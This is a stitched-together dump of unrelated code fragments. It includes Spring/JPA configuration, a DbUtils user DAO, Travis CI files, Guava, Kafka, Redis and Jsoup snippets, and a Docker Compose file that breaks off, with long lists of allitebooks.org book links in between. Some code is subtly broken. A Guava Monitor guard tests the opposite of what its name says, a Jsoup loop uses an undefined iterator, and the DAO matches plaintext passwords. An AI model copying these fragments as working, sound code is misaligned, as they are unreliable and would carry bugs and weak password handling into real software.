import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.EclipseLinkJpaDialect;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.sql.DataSource;
import java.util.Properties;

/**
 * @author Tomasz Nurkiewicz
 * @since 6/2/13, 5:06 PM
 */
@Configuration
@EnableTransactionManagement
@EnableJpaRepositories
public class Spring {

	@Bean
	public DataSource dataSource() {
		final JdbcDataSource ds = new JdbcDataSource();
		ds.setURL("jdbc:h2:mem:books;DB_CLOSE_DELAY=-1");
		return ds;
	}

	@Bean
	@DependsOn("flyway")
	public LocalContainerEntityManagerFactoryBean entityManagerFactory(){
		final LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
		factoryBean.setDataSource(dataSource());
		factoryBean.setPackagesToScan("com.blogspot.nurkiewicz");
		factoryBean.setMappingResources("META-INF/orm.xml");
		factoryBean.setJpaDialect(jpaDialect());
		factoryBean.setPersistenceProvider(persistenceProvider());
		factoryBean.setJpaProperties(jpaProperties());
		return factoryBean;
	}

	@Bean
	public Properties jpaProperties() {
		final Properties properties = new Properties();
		properties.setProperty("javax.persistence.schema-generation.database.action", "none");
		properties.setProperty("eclipselink.weaving", Boolean.FALSE.toString());
		properties.setProperty("eclipselink.logging.logger", Slf4jSessionLogger.class.getName());
		properties.setProperty("eclipselink.logging.level.sql", "FINE");
		properties.setProperty("eclipselink.logging.parameters", Boolean.TRUE.toString());
		return properties;
	}

	@Bean
	public EclipseLinkJpaDialect jpaDialect() {
		return new EclipseLinkJpaDialect();
	}

	@Bean
	public PersistenceProvider persistenceProvider() {
		return new PersistenceProvider();
	}

	@Bean
	public PlatformTransactionManager transactionManager() {
		return new JpaTransactionManager(
				entityManagerFactory().getObject()
		);
	}

	@Bean(initMethod = "migrate")
	public Flyway flyway() {
		final Flyway flyway = new Flyway();
		flyway.setDataSource(dataSource());
		return flyway;
	}

}
--------------------------------------------------------------------------------------------------------
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.authentication.switchuser.SwitchUserGrantedAuthority;

import javax.servlet.*;
import java.io.IOException;

/**
 * @author Tomasz Nurkiewicz
 * @since 6/29/13, 8:52 PM
 */
@Slf4j
public class UserNameFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        final Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        final String userName = authentication.getName();
        final String realName = findSwitchedUser(authentication);
        final String fullName = userName + (realName != null ? " (" + realName + ")" : "");

        MDC.put("user", fullName);
        try {
            chain.doFilter(request, response);
        } finally {
            MDC.remove("user");
        }
    }

    private String findSwitchedUser(Authentication authentication) {
        for (GrantedAuthority auth : authentication.getAuthorities()) {
            if (auth instanceof SwitchUserGrantedAuthority) {
                return ((SwitchUserGrantedAuthority) auth).getSource().getName();
            }
        }
        return null;
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
--------------------------------------------------------------------------------------------------------

import org.apache.commons.dbutils.QueryRunner;
import org.apache.commons.dbutils.handlers.BeanHandler;

import utils.JdbcUtils;
import dao.UserDao;
import domain.User;

public class UserDaoImpl implements UserDao {

	/* (non-Javadoc)
	 * @see dao.impl.UserDao#add(domain.User)
	 */
	public void add(User user){
		try{
			QueryRunner runner = new QueryRunner(JdbcUtils.getDataSource());
			String sql = "insert into user(id,username,password,phone,cellphone,address,email) values(?,?,?,?,?,?,?)";
			Object params[] = {user.getId(), user.getUsername(), user.getPassword(), user.getPhone(), user.getCellphone(), user.getAddress(), user.getEmail()};
			runner.update(sql, params);
		} catch(Exception e){
			throw new RuntimeException(e);
		}
	}
	
	/* (non-Javadoc)
	 * @see dao.impl.UserDao#find(java.lang.String)
	 */
	public User find(String id){
		try{
			QueryRunner runner = new QueryRunner(JdbcUtils.getDataSource());
			String sql = "select * from user where id=?";
			return (User)runner.query(sql, id, new BeanHandler(User.class));
		} catch(Exception e){
			throw new RuntimeException(e);
		}
	}
	
	/* (non-Javadoc)
	 * @see dao.impl.UserDao#find(java.lang.String, java.lang.String)
	 */
	public User find(String username, String password){
		try{
			QueryRunner runner = new QueryRunner(JdbcUtils.getDataSource());
			String sql = "select * from user where username=? and password=?";
			Object params[] = {username, password};
			return (User)runner.query(sql, params, new BeanHandler(User.class));
		} catch(Exception e){
			throw new RuntimeException(e);
		}
	}
}
--------------------------------------------------------------------------------------------------------
language: ruby
node_js:
  - 'node'
rvm:
  - 2.5.3
env:
  - TRAVIS_NODE_VERSION="7"
install:
  - rm -rf ~/.nvm && git clone https://github.com/creationix/nvm.git ~/.nvm && (cd ~/.nvm && git checkout `git describe --abbrev=0 --tags`) && source ~/.nvm/nvm.sh && nvm install $TRAVIS_NODE_VERSION
  - npm install
before_script:
  - gem install awesome_bot
  - npm install --global awesome-lint
script:
  - awesome-lint
  - awesome_bot README.md --allow-dupe --allow-redirect --white-list www.cubrid.org,medium.freecodecamp.com,learn.hackerearth.com,wildlyinaccurate.com,projecteuler.net,www.coursera.org,www.topcoder.com,www.codechef.com,www.joelonsoftware.com
  - awesome_bot README.md --white-list $(paste -d, -s white_listed_sites.txt) --allow-ssl --allow-redirect
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.MoreCollectors;

import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public class MoreCollectorsExample {

    public static void main(String[] args) {
        List<Integer> numbers = Arrays.asList(1);
        Optional<Integer> number = numbers
          .stream()
          .map(e -> e * 2)
          .collect(MoreCollectors.toOptional());
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.common.util.concurrent.Monitor;

import java.util.ArrayList;
import java.util.List;

public class MonitorExample {
    private List<String> students = new ArrayList<String>();
    private static final int MAX_SIZE = 100;

    private Monitor monitor = new Monitor();

    public void addToCourse(String item) throws InterruptedException {
        Monitor.Guard studentsBelowCapacity = monitor.newGuard(this::isStudentsCapacityUptoLimit);
        monitor.enterWhen(studentsBelowCapacity);
        try {
            students.add(item);
        } finally {
            monitor.leave();
        }
    }

    public Boolean isStudentsCapacityUptoLimit() {
        return students.size() > MAX_SIZE;
    }
}
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.Interner;
import com.google.common.collect.Interners;

public class InternerBuilderExample {

    public static void main(String[] args) {
        Interner<Integer> interners = Interners.<Integer> newBuilder()
          .concurrencyLevel(2)
          .strong().<Integer> build();

    }

}
--------------------------------------------------------------------------------------------------------
import com.google.common.collect.Comparators;

import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

public class ComparatorsExamples {

    public static void main(String[] args) {

        List<Integer> integers = Arrays.asList(1, 2, 3, 4, 4, 6, 7, 8, 9, 10);
        boolean isInAscendingOrder = Comparators.isInOrder(integers, new AscedingOrderComparator());
        System.out.println(isInAscendingOrder);

    }

    private static class AscedingOrderComparator implements Comparator<Integer> {
        @Override
        public int compare(Integer o1, Integer o2) {
            return o1.compareTo(o2);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    <!-- configure root logger conditionally -->	
    <property scope="context" resource="application.properties" />
	
    <if condition='property("env").equals("dev")'>
        <then>
            <root level="TRACE">
                <appender-ref ref="STDOUT" />
            </root>
        </then>
    </if>
--------------------------------------------------------------------------------------------------------
import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.IdClass;

@Entity
@IdClass(OrderEntryPK.class)
public class OrderEntryIdClass {
    @Id
    private long orderId;
    @Id
    private long productId;

    public long getOrderId() {
        return orderId;
    }

    public void setOrderId(long orderId) {
        this.orderId = orderId;
    }

    public long getProductId() {
        return productId;
    }

    public void setProductId(long productId) {
        this.productId = productId;
    }

}
--------------------------------------------------------------------------------------------------------
http://www.allitebooks.org/the-iot-hackers-handbook/
http://www.allitebooks.org/linux-basics-for-hackers/
http://www.allitebooks.org/mastering-kali-linux-for-advanced-penetration-testing/
http://www.allitebooks.org/mastering-kali-linux-for-advanced-penetration-testing/
http://www.allitebooks.org/the-network-security-test-lab/
http://www.allitebooks.org/ntp-security/
http://www.allitebooks.org/effective-python-penetration-testing/
http://www.allitebooks.org/privileged-attack-vectors/
http://www.allitebooks.org/effective-python-penetration-testing/
http://www.allitebooks.org/mastering-nmap-scripting-engine/
http://www.allitebooks.org/network-security-through-data-analysis-2nd-edition/
http://www.allitebooks.org/learning-game-ai-programming-with-lua/
http://www.allitebooks.org/lua-game-development-cookbook/
http://www.allitebooks.org/create-mobile-games-with-corona/
http://www.allitebooks.org/network-security-through-data-analysis/
http://www.allitebooks.org/kali-linux-cookbook/
http://www.allitebooks.org/learning-kali-linux/
http://www.allitebooks.org/kali-linux-ctf-blueprints/
http://www.allitebooks.org/penetration-testing/
http://www.allitebooks.org/penetration-testing-with-the-bash-shell/
http://www.allitebooks.org/kali-linux-network-scanning-cookbook/
http://www.allitebooks.org/penetration-testing-with-raspberry-pi/
http://www.allitebooks.org/mastering-wireless-penetration-testing-for-highly-secured-environments/
http://www.allitebooks.org/penetration-testing-with-backbox/
http://www.allitebooks.org/the-hacker-playbook-practical-guide-to-penetration-testing/
http://www.allitebooks.org/python-penetration-testing-essentials/
http://www.allitebooks.org/building-virtual-pentesting-labs-for-advanced-penetration-testing/
http://www.allitebooks.org/kali-linux-2-windows-penetration-testing/
http://www.allitebooks.org/kali-linux-wireless-penetration-testing-beginners-guide/
http://www.allitebooks.org/web-penetration-testing-with-kali-linux/
http://www.allitebooks.org/kali-linux-web-penetration-testing-cookbook/
http://www.allitebooks.org/web-penetration-testing-with-kali-linux-second-edition/
http://www.allitebooks.org/kali-linux-2-assuring-security-by-penetration-testing-3rd-edition/
http://www.allitebooks.org/kali-linux-cookbook/
http://www.allitebooks.org/mastering-kali-linux-wireless-pentesting/
http://www.allitebooks.org/beginning-ethical-hacking-with-python/
http://www.allitebooks.org/network-security-hacks-2nd-edition/
http://www.allitebooks.org/hacking-marketing/
http://www.allitebooks.org/hacking-android/
http://www.allitebooks.org/application-security-for-the-android-platform/
http://www.allitebooks.org/android-hackers-handbook/
http://www.allitebooks.org/learning-pentesting-for-android-devices/
http://www.allitebooks.org/exploring-se-for-android/
http://www.allitebooks.org/android-application-programming-with-opencv/
http://www.allitebooks.org/learning-image-processing-with-opencv/
http://www.allitebooks.org/opencv-essentials/
http://www.allitebooks.org/monetizing-machine-learning/
http://www.allitebooks.org/raspberry-pi-iot-projects/
http://www.allitebooks.org/beginning-artificial-intelligence-with-the-raspberry-pi/
http://www.allitebooks.org/hacking-vim-7-2/
http://www.allitebooks.org/cybersecurity-for-hospitals-and-healthcare-facilities/
http://www.allitebooks.org/building-a-hipaa-compliant-cybersecurity-program/
http://www.allitebooks.org/machine-learning-for-hackers/
http://www.allitebooks.org/machine-learning-paradigms-applications-in-recommender-systems/
http://www.allitebooks.org/learn-to-code-with-games/
http://www.allitebooks.org/machine-learning-for-audio-image-and-video-analysis-2nd-edition/
http://www.allitebooks.org/bandit-algorithms-for-website-optimization/
http://www.allitebooks.org/hack-and-hhvm/
http://www.allitebooks.org/hacking-raspberry-pi/
http://www.allitebooks.org/instant-raspberry-pi-gaming/
http://www.allitebooks.org/raspberry-pi-gaming-2nd-edition/
http://www.allitebooks.org/python-hacking-essentials/
http://www.allitebooks.org/linux-hacker/
http://www.allitebooks.org/linux-networking-cookbook/
http://www.allitebooks.org/tcpip-architecture-design-and-implementation-in-linux/
http://www.allitebooks.org/understanding-linux-network-internals/
http://www.allitebooks.org/windows-8-hacks/
http://www.allitebooks.org/big-book-of-windows-hacks/
http://www.allitebooks.org/windows-vista-annoyances/
http://www.allitebooks.org/kinect-hacks/
http://www.allitebooks.org/hacking-point-of-sale/
http://www.allitebooks.org/hackers/
http://www.allitebooks.org/advanced-programming-in-the-unix-environment-3rd-edition/
http://www.allitebooks.org/essential-system-administration-3rd-edition/
http://www.allitebooks.org/shell-scripting/
http://www.allitebooks.org/hacking-and-securing-ios-applications/
http://www.allitebooks.org/pro-bash-programming/
http://www.allitebooks.org/expert-shell-scripting/
http://www.allitebooks.org/mastering-unix-shell-scripting/
http://www.allitebooks.org/learning-shell-scripting-with-zsh/
http://www.allitebooks.org/network-security-hacks-2nd-edition/
http://www.allitebooks.org/security-power-tools/
http://www.allitebooks.org/50-android-hacks/
http://www.allitebooks.org/hello-android-3rd-edition/
http://www.allitebooks.org/ubuntu-hacks/
http://www.allitebooks.org/ubuntu-hacks/
http://www.allitebooks.org/linux-server-hacks/
http://www.allitebooks.org/bsd-hacks/
http://www.allitebooks.org/professional-linux-programming/
http://www.allitebooks.org/beginning-linux-programming-4th-edition/
http://www.allitebooks.org/devops-troubleshooting-linux-server-best-practices/
http://www.allitebooks.org/linux-thin-client-networks-design-and-deployment/
http://www.allitebooks.org/linux-network-administrators-guide-3rd-edition/
http://www.allitebooks.org/html5-hacks/
http://www.allitebooks.org/migration-to-html5-and-css3-how-to/
http://www.allitebooks.org/migration-to-html5-and-css3-how-to/
http://www.allitebooks.org/hello-html5-css3/
http://www.allitebooks.org/html5-and-css3-2nd-edition/
http://www.allitebooks.org/professional-red-teaming/
http://www.allitebooks.org/data-analysis-for-network-cyber-security/
http://www.allitebooks.org/professional-red-teaming/
http://www.allitebooks.org/wireshark-network-security/
http://www.allitebooks.org/advanced-perl-programming-2nd-edition/
http://www.allitebooks.org/privileged-attack-vectors/
http://www.allitebooks.org/practical-video-game-bots/
http://www.allitebooks.org/game-hacking/
http://www.allitebooks.org/learning-unreal-engine-android-game-development/
http://www.allitebooks.org/firewalls-dont-stop-dragons-3rd-edition/
http://www.allitebooks.org/stack-frames/
http://www.allitebooks.org/network-forensics/
http://www.allitebooks.org/open-source-intelligence-methods-and-tools/
http://www.allitebooks.org/raspberry-pi-user-guide/
http://www.allitebooks.org/raspberry-pi-computer-architecture-essentials/
http://www.allitebooks.org/it-disaster-response/
http://www.allitebooks.org/defensive-security-handbook/
http://www.allitebooks.org/learning-saltstack-second-edition/
http://www.allitebooks.org/gitolite-essentials/
http://www.allitebooks.org/salt-essentials/
http://www.allitebooks.org/mastering-puppet/
http://www.allitebooks.org/instant-puppet-3-starter/
http://www.allitebooks.org/netcat-starter/
http://www.allitebooks.org/essential-snmp-2nd-edition/
http://www.allitebooks.org/wireshark-starter/
http://www.allitebooks.org/practical-packet-analysis/
http://www.allitebooks.org/distributed-graph-algorithms-for-computer-networks/
http://www.allitebooks.org/fundamentals-of-sensor-network-programming/
http://www.allitebooks.org/distributed-graph-algorithms-for-computer-networks/
http://www.allitebooks.org/burp-suite-starter/
http://www.allitebooks.org/network-analysis-using-wireshark-cookbook/
http://www.allitebooks.org/the-book-of-pf-a-no-nonsense-guide-to-the-openbsd-firewall/
http://www.allitebooks.org/understanding-tcpip/
http://www.allitebooks.org/packet-guide-to-core-network-protocols/
http://www.allitebooks.org/raspberry-pi-projects-for-dummies/
http://www.allitebooks.org/electronics-cookbook/
http://www.allitebooks.org/kali-linux-2-windows-penetration-testing/
http://www.allitebooks.org/data-analysis-for-network-cyber-security/
http://www.allitebooks.org/practical-internet-of-things-security/
http://www.allitebooks.org/professional-red-teaming/
http://www.allitebooks.org/programmers-guide-to-drupal-2nd-edition/
http://www.allitebooks.org/smart-home-automation-with-linux-and-raspberry-pi-2nd-edition/
http://www.allitebooks.org/beginning-nfc/
http://www.allitebooks.org/android-application-development/
http://www.allitebooks.org/android-development-tools-for-eclipse/
http://www.allitebooks.org/learn-electronics-with-raspberry-pi/
http://www.allitebooks.org/instant-raspberry-pi-gaming/
http://www.allitebooks.org/raspberry-pi-gaming-2nd-edition/
http://www.allitebooks.org/ios-sensor-apps-with-arduino/
http://www.allitebooks.org/basic-sensors-in-ios/
http://www.allitebooks.org/learning-ecmascript-6/
http://www.allitebooks.org/learning-underscore-js/
http://www.allitebooks.org/javascript-concurrency/
http://www.allitebooks.org/building-scalable-apps-with-redis-and-node-js/
http://www.allitebooks.org/node-js-essentials/
http://www.allitebooks.org/building-apis-with-node-js/
http://www.allitebooks.org/ext-js-data-driven-application-design/
http://www.allitebooks.org/javascript-with-promises/
http://www.allitebooks.org/websocket-lightweight-client-server-communications/
http://www.allitebooks.org/building-node-applications-with-mongodb-and-backbone/
http://www.allitebooks.org/maintainable-javascript/
http://www.allitebooks.org/learning-javascript-design-patterns/
http://www.allitebooks.org/mastering-javascript-design-patterns/
http://www.allitebooks.org/cloud-architecture-patterns/
http://www.allitebooks.org/pro-javascript-design-patterns/
http://www.allitebooks.org/pragmatic-guide-to-javascript/
http://www.allitebooks.org/pro-javascript-performance/
http://www.allitebooks.org/expert-javascript/
http://www.allitebooks.org/pro-javascript-techniques/
http://www.allitebooks.org/pro-javascript-for-web-apps/
http://www.allitebooks.org/the-modern-web/
http://www.allitebooks.org/jump-start-javascript/
http://www.allitebooks.org/fundamentals-of-web-development/
http://www.allitebooks.org/web-application-design-and-implementation/
http://www.allitebooks.org/fundamentals-of-web-development/
http://www.allitebooks.org/effective-javascript/
http://www.allitebooks.org/javascript-creativity/
http://www.allitebooks.org/plug-in-javascript-100-power-solutions/
http://www.allitebooks.org/modern-javascript/
http://www.allitebooks.org/beginning-javascript-with-dom-scripting-and-ajax-2nd-edition/
http://www.allitebooks.org/object-oriented-javascript/
http://www.allitebooks.org/mastering-object-oriented-python/
http://www.allitebooks.org/mastering-javascript-design-patterns/
http://www.allitebooks.org/object-oriented-javascript-2nd-edition/
http://www.allitebooks.org/learning-ecmascript-6/
http://www.allitebooks.org/backbone-js-patterns-and-best-practices/
http://www.allitebooks.org/typescript-essentials/
http://www.allitebooks.org/learning-typescript/
http://www.allitebooks.org/node-js-blueprints/
http://www.allitebooks.org/beautiful-javascript-leading-programmers-explain-how-they-think/
http://www.allitebooks.org/practical-web-development/
http://www.allitebooks.org/jasmine-cookbook/
http://www.allitebooks.org/arcgis-for-javascript-developers-by-example/
http://www.allitebooks.org/introducing-arcgis-api-4-for-javascript/
http://www.allitebooks.org/mastering-knockoutjs/
http://www.allitebooks.org/beginning-javascript-5th-edition/
http://www.allitebooks.org/backbone-js-patterns-and-best-practices/
http://www.allitebooks.org/learning-javascript/
http://www.allitebooks.org/developing-web-components/
http://www.allitebooks.org/practical-information-security-management/
http://www.allitebooks.org/cyber-physical-attack-recovery-procedures/
--------------------------------------------------------------------------------------------------------
import org.springframework.messaging.Message;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * JSON Message converter - String on output, String, Bytes, or byte[] on input. Used in
 * conjunction with Kafka
 * {@code StringSerializer/StringDeserializer or BytesDeserializer}. Consider using the
 * BytesJsonMessageConverter instead.
 *
 * @author Gary Russell
 * @author Artem Bilan
 * @author Dariusz Szablinski
 */
public class StringJsonMessageConverter extends JsonMessageConverter {

	public StringJsonMessageConverter() {
		super();
	}

	public StringJsonMessageConverter(ObjectMapper objectMapper) {
		super(objectMapper);
	}

	@Override
	protected Object convertPayload(Message<?> message) {
		try {
			return getObjectMapper()
					.writeValueAsString(message.getPayload());
		}
		catch (JsonProcessingException e) {
			throw new ConversionException("Failed to convert to JSON", e);
		}
	}

}
--------------------------------------------------------------------------------------------------------
http://www.allitebooks.org/internet-of-things-with-python/
http://www.allitebooks.org/internet-of-things-with-intel-galileo/
http://www.allitebooks.org/home-automation-with-intel-galileo/
http://www.allitebooks.org/intel-galileo-networking-cookbook/
http://www.allitebooks.org/arduino-networking/
http://www.allitebooks.org/building-arduino-plcs/
http://www.allitebooks.org/internet-of-things-with-esp8266/
http://www.allitebooks.org/learning-iot-with-particle-photon-and-electron/
http://www.allitebooks.org/c-programming-for-arduino/
http://www.allitebooks.org/learn-robotics-with-raspberry-pi/
http://www.allitebooks.org/raspberry-pi-robotic-projects/
http://www.allitebooks.org/raspberry-pi-robotics-projects-second-edition/
http://www.allitebooks.org/intel-galileo-blueprints/
http://www.allitebooks.org/arduino-by-example/
http://www.allitebooks.org/building-a-home-security-system-with-arduino/
http://www.allitebooks.org/arduino-home-automation/
http://www.allitebooks.org/internet-of-things-with-the-arduino-yun/
http://www.allitebooks.org/server-load-balancing/
http://www.allitebooks.org/designing-large-scale-lans/
http://www.allitebooks.org/advanced-wireless-networks-cognitive-cooperative-opportunistic-4g-technology-2nd-edition/
http://www.allitebooks.org/indoor-radio-planning-a-practical-guide-for-2g-3g-and-4g-3rd-edition/
http://www.allitebooks.org/femtocells-design-and-application/
http://www.allitebooks.org/next-generation-mobile-systems-3g-beyond/
http://www.allitebooks.org/4g-wireless-video-communications/
http://www.allitebooks.org/mobile-handset-design/
http://www.allitebooks.org/arduino-wearable-projects/
http://www.allitebooks.org/arduino-wearable-projects/
http://www.allitebooks.org/practical-fashion-tech/
http://www.allitebooks.org/computer-organization-and-design-fifth-edition/
http://www.allitebooks.org/making-sense-of-sensors/
http://www.allitebooks.org/embedded-firmware-solutions/
http://www.allitebooks.org/crafting-wearables/
http://www.allitebooks.org/epub-3-best-practices/
http://www.allitebooks.org/html5-for-publishers/
http://www.allitebooks.org/html5-video-how-to/
http://www.allitebooks.org/html5-media/
http://www.allitebooks.org/machining-for-dummies/
http://www.allitebooks.org/electronics-for-kids/
http://www.allitebooks.org/digital-security-cyber-terror-and-cyber-security/
http://www.allitebooks.org/discovering-computers-2016/
http://www.allitebooks.org/a-newbies-guide-to-apple-watch/
http://www.allitebooks.org/apple-watch-app-development/
http://www.allitebooks.org/swift-for-beginners-develop-and-design/
http://www.allitebooks.org/canvas-lms-course-design/
http://www.allitebooks.org/jira-essentials-third-edition/
http://www.allitebooks.org/tensorflow-for-deep-learning/
http://www.allitebooks.org/infrastructure-software-modules-for-enterprises/
http://www.allitebooks.org/numerical-python-2nd-edition/
http://www.allitebooks.org/learning-bing-maps-api/
http://www.allitebooks.org/microsoft-mapping/
http://www.allitebooks.org/practical-free-alternatives-to-commercial-software/
http://www.allitebooks.org/jira-6-x-administration-cookbook/
http://www.allitebooks.org/arduino-programming-with-net-and-sketch/
http://www.allitebooks.org/junk-box-arduino/
http://www.allitebooks.org/junk-box-arduino/
http://www.allitebooks.org/arduino-cookbook/
http://www.allitebooks.org/programming-arduino-with-labview/
http://www.allitebooks.org/arduino-robotic-projects/
http://www.allitebooks.org/beaglebone-by-example/
http://www.allitebooks.org/advanced-wireless-communications-4g-cognitive-and-cooperative-broadband-technology-2nd-edition/
http://www.allitebooks.org/arduino-2nd-edition/
http://www.allitebooks.org/http-succinctly/
http://www.allitebooks.org/mobile-communication-systems/
http://www.allitebooks.org/camel-intelligent-networks-for-the-gsm-gprs-and-umts-network/
http://www.allitebooks.org/boost-asio-c-network-programming/
http://www.allitebooks.org/beaglebone-home-automation/
http://www.allitebooks.org/abusing-the-internet-of-things-blackouts-freakouts-and-stakeouts/
http://www.allitebooks.org/making-things-talk-second-edition/
http://www.allitebooks.org/raspberry-pi-home-automation-with-arduino-second-edition/
http://www.allitebooks.org/arduino-development-cookbook/
http://www.allitebooks.org/designing-the-internet-of-things/
--------------------------------------------------------------------------------------------------------
language: java
jdk: oraclejdk8
install: true
before_cache:
  - rm -f $HOME/.gradle/caches/modules-2/modules-2.lock
cache:
  directories:
    - $HOME/.gradle/caches/
    - $HOME/.gradle/wrapper/
script:
  - ./gradlew check --no-daemon
--------------------------------------------------------------------------------------------------------
Set<HttpMethod> optionsForAllow = restTemplate.optionsForAllow(fooResourceUrl);
HttpMethod[] supportedMethods
  = {HttpMethod.GET, HttpMethod.POST, HttpMethod.PUT, HttpMethod.DELETE};
assertTrue(optionsForAllow.containsAll(Arrays.asList(supportedMethods)));
--------------------------------------------------------------------------------------------------------
EntityUtils.toString(response.getEntity(), "UTF-8")
String responseXml = EntityUtils.toString(httpResponse.getEntity());
EntityUtils.consume(httpResponse.getEntity());

   String inputLine ;
 BufferedReader br = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
 try {
       while ((inputLine = br.readLine()) != null) {
              System.out.println(inputLine);
       }
       br.close();
  } catch (IOException e) {
       e.printStackTrace();
  }
--------------------------------------------------------------------------------------------------------
	/**
	 * @author Christoph Strobl
	 * @since 1.7
	 */
	static class RedisCriteriaAccessor implements CriteriaAccessor<RedisOperationChain> {

		@Override
		public RedisOperationChain resolve(KeyValueQuery<?> query) {
			return (RedisOperationChain) query.getCriteria();
		}
	}
	
		/**
	 * Redis specific {@link KeyValueCallback}.
	 *
	 * @author Christoph Strobl
	 * @param <T>
	 * @since 1.7
	 */
	public static abstract class RedisKeyValueCallback<T> implements KeyValueCallback<T> {

		/*
		 * (non-Javadoc)
		 * @see org.springframework.data.keyvalue.core.KeyValueCallback#doInKeyValue(org.springframework.data.keyvalue.core.KeyValueAdapter)
		 */
		@Override
		public T doInKeyValue(KeyValueAdapter adapter) {
			return doInRedis((RedisKeyValueAdapter) adapter);
		}

		public abstract T doInRedis(RedisKeyValueAdapter adapter);
	}
--------------------------------------------------------------------------------------------------------
import org.springframework.data.redis.serializer.RedisSerializer;
import org.springframework.data.redis.serializer.SerializationException;
import org.springframework.lang.Nullable;

/**
 * @author Mark Paluch
 */
enum RawRedisSerializer implements RedisSerializer<byte[]> {

	INSTANCE;

	@Nullable
	@Override
	public byte[] serialize(@Nullable byte[] bytes) throws SerializationException {
		return bytes;
	}

	@Nullable
	@Override
	public byte[] deserialize(@Nullable byte[] bytes) throws SerializationException {
		return bytes;
	}
}
--------------------------------------------------------------------------------------------------------

import org.apache.kafka.clients.consumer.Consumer;
import org.apache.kafka.clients.consumer.ConsumerRecords;

import org.springframework.core.task.SimpleAsyncTaskExecutor;
import org.springframework.kafka.KafkaException;
import org.springframework.util.Assert;

/**
 * A container error handler that stops the container after an exception
 * is thrown by the listener.
 *
 * @author Gary Russell
 * @since 2.1
 *
 */
public class ContainerStoppingBatchErrorHandler implements ContainerAwareBatchErrorHandler {

	private final Executor executor;

	public ContainerStoppingBatchErrorHandler() {
		this.executor = new SimpleAsyncTaskExecutor();
	}

	public ContainerStoppingBatchErrorHandler(Executor executor) {
		Assert.notNull(executor, "'executor' cannot be null");
		this.executor = executor;
	}

	@Override
	public void handle(Exception thrownException, ConsumerRecords<?, ?> data, Consumer<?, ?> consumer,
			MessageListenerContainer container) {
		this.executor.execute(() -> container.stop());
		// isRunning is false before the container.stop() waits for listener thread
		int n = 0;
		while (container.isRunning() && n++ < 100) { // NOSONAR magic #
			try {
				Thread.sleep(100); // NOSONAR magic #
			}
			catch (InterruptedException e) {
				Thread.currentThread().interrupt();
				break;
			}
		}
		throw new KafkaException("Stopped container", thrownException);
	}

}
--------------------------------------------------------------------------------------------------------
/**
 * Finds a set of elements through a CSS selector and swaps its tag with
 * that from its parent.
 * 
 * @param root
 *            body element with source divisions to upgrade
 * @param selector
 *            CSS selector for the elements to swap with its parent
 */
public final void swapTagWithParent(final Element root,
    final String selector) {
  final Iterable<Element> elements; // Selected elements
  Element parent;                   // Parent element
  String text;                      // Preserved text
  checkNotNull(root, "Received a null pointer as root element");
  checkNotNull(selector, "Received a null pointer as selector");
  // Selects and iterates over the elements
  elements = root.select(selector);
  for (final Element element : elements) {
    parent = element.parent();
    // Takes the text out of the element
    text = element.text();
    element.text("");
    // Swaps elements
    parent.replaceWith(element);
    element.appendChild(parent);
    // Sets the text into what was the parent element
    parent.text(text);
  }
}

Elements elements = doc.select("img[src$=a.gif]");
 for(Element element : elements)
 {
  element.replaceWith(new TextNode("A", null));
 }
--------------------------------------------------------------------------------------------------------
 File input = new File("your.html");
Document doc = Jsoup.parse(input, "UTF-8");

Elements links = doc.select("a[href]");

while (links.hasNext()) {
 Element link = iterator.next();
 Element bold = doc.createElement("b").appendText(link.text());
 link.replaceWith(bold);
}

Elements elements = doc.select("img[src$=a.gif]");
 for(Element element : elements)
 {
  element.replaceWith(new TextNode("A", null));
 }
 
  Document doc = Jsoup.parse(html);
for (Element small: doc.select("small")) {
 small.replaceWith(new Element(Tag.valueOf("span"), "").text(small.text()));
}
System.out.println(doc.html()); // prints html with <small> replaced by <span>

 for (Element elem : document.select(".singolo-contenuto a")) {
  if(elem.parents().hasClass("list_attachments")) continue;
  String href = elem.attr("href");
  String text = elem.text();
  elem.replaceWith(new TextNode(href + " " + text, ""));
}
String result = document.select(".singolo-contenuto").text();



 Document doc = Jsoup.parse(inputHtml);
Elements links = doc.select("a");
String baseUri = links.get(0).baseUri();
for(Element link : links) {
  Node linkText = new TextNode(link.html(), baseUri);
  // optionally wrap it in a tag instead:
  // Element linkText = doc.createElement("span");
  // linkText.html(link.html());
  link.replaceWith(linkText);
}



--------------------------------------------------------------------------------------------------------
https://github.com/spring-projects/spring-kafka/blob/654d3bf5c7c59514b3191bf1cf8218c9370987fa/spring-kafka/src/test/java/org/springframework/kafka/listener/TransactionalContainerTests.java
Compare a Set of Files

$ diffuse file1 file2 file3
Review Local Changes or Fix Merge Conflicts

$ diffuse -m
Compare Specific Revisions

$ diffuse -r rev1 -r rev2 file
Inspect a Revision

$ diffuse -c rev
--------------------------------------------------------------------------------------------------------
# Basic function options
x-function: &function
  labels:
    function: "true"
  depends_on:
    - gateway
  networks:
    - functions
# Linux placement
x-linux: &linux-only
  deploy:
    placement:
      constraints:
        - 'node.platform.os == linux'
# Windows placement
x-windows: &windows-only
  deploy:
    placement:
      constraints:
        - 'node.platform.os == windows'
services:
  # Node.js gives OS info about the node (Host)
  nodeinfo:
    <<: *function
    <<: *linux-only
    image: functions/nodeinfo:latest
    environment:
      no_proxy: "gateway"
      https_proxy: $https_proxy
  # Uses `cat` to echo back response, fastest function to execute.
  echoit:
    <<: *function
    <<: *linux-only
    image: functions/alpine:health
    environment:
